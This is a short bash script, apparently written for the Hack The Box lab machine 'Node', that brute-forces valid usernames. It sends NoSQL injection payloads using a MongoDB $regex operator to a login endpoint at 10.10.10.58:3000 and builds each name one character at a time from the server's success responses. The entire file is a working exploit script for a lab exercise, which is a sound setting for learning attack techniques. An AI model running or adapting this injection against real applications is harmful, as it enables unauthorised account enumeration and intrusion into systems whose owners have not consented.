#!/bin/bash

# Usage: ./htb-node-enumerate.sh r

chars='qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM$'

function getchar() {
	for (( i=0; i<${#chars}; i++ )); do

		if [ -z $2 ]; then
			echo "trying $1${chars:$i:1}..."
		else
			echo -en "\033[99D\033[KChecking for $1${chars:$i:1}" 1>&2
		fi

		CHN=$(curl -s -H 'Content-Type: application/json;charset=utf-8' -d '{"username":{"$regex":"^'$1${chars:$i:1}'"},"password":"asdasd"}' 10.10.10.58:3000/api/session/authenticate | grep 'success' | wc -l)
		if [ $CHN -gt 0 ]; then
			if [ -z $2 ]; then
				echo "+--> Found: "$1${chars:$i:1}
			else
				echo -en "\033[999D\033[K\r" 1>&2
				echo $1${chars:$i:1}
				break
			fi
		fi
	done
}

if [ -z $1 ]; then
	getchar '^'${chars:$a:1}
else
	CHECK=${1}
	for (( a=0; a<=100; a++ )); do
		echo -en "\033[99D\033[KChecking for ${CHECK}"
		RES=$(getchar ${CHECK} s)
		if [ "${RES: -1}" != '$' ]; then
			CHECK=$RES
		else
			RES=$(getchar ${CHECK}'$' s)
			echo "+--> Found: ${1}${RES:1: -2}"
			exit
		fi
	done
fi
